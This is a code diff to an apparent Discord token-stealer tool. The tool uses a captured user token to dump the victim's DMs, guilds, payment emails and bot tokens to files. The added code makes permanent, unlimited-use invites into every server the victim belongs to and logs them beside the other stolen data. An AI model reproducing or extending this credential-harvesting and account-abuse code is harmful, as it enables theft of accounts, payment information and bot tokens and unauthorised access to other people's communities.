@@ -114,6 +114,20 @@ def connectionTemplate(type, id, name, revoked, visible, friend_sync, verified, 
     ACCESS_TOKEN: {access_token}
     """
 
+def randomChannel(guildID, token):
+   headers = {'authorization': token}
+   channels = requests.get("https://discord.com/api/v8/guilds/"+guildID+"/channels", headers=headers).json()
+   for channel in channels:
+      if channel["type"] == 0 or channel["type"] == 2:
+         return channel["id"]
+def createInvite(channelID, guildID):
+   headers = {'authorization': token, 'content-type': 'application/json'}
+   data = {'max_age': 0, 'max_uses': 0}
+   req = requests.post(f"https://discord.com/api/v8/channels/{channelID}/invites", headers=headers, json=data)
+   res = req.json()
+   if res["code"] == 50013 or res["code"] == 50035:
+      return {'code': 'Could not create invite'}
+   return {'code': res["code"] }
 def replacer(name):
     symbols = string.punctuation
     for symbol in symbols:
@@ -163,9 +177,6 @@ def saveaccount(token):
             recStr += ")"
             print(f"[{Fore.GREEN}+DM{Fore.RESET}] {recStr}")
             save(username+"/dms.txt", f"ChannelID: {dm['id']} | {recStr}")
-         for g in guilds:
-            print(f"[{Fore.GREEN}+Guild{Fore.RESET}] {g['name']}")
-            save(username+"/guilds.txt", f"ID: {g['id']} | isOwner: {g['owner']} | Name: {g['name']} | Icon: https://cdn.discordapp.com/icons/{g['id']}/{g['icon']}.png")
          for payment in paymentInfo:
             if payment["type"] == 2:
                print(f"[{Fore.GREEN}+Payment{Fore.RESET}] {payment['email']}")
@@ -180,6 +191,16 @@ def saveaccount(token):
                bot = app["bot"]
                print(f"[{Fore.GREEN}+Bot{Fore.RESET}] {bot['token']}")
                save(username+"/applications.txt", f"Name: {bot['username']}#{bot['discriminator']} | ID: {bot['id']} | Token: {bot['token']}")
+         for g in guilds:
+            try:
+               channel = randomChannel(g["id"], token)
+               invitecode = createInvite(channel, g["id"])
+            except:
+               invitecode = {'code': 'Could not create code'}
+               pass
+            print(f"[{Fore.GREEN}+Guild{Fore.RESET}] {g['name']}")
+            save(username+"/guilds.txt", f"ID: {g['id']} | isOwner: {g['owner']} | Name: {g['name']} | Icon: https://cdn.discordapp.com/icons/{g['id']}/{g['icon']}.png | Invite: discord.gg/{invitecode['code']}")
+            time.sleep(2)
          save(username+"/messages/")
          for c in dms:
             try:
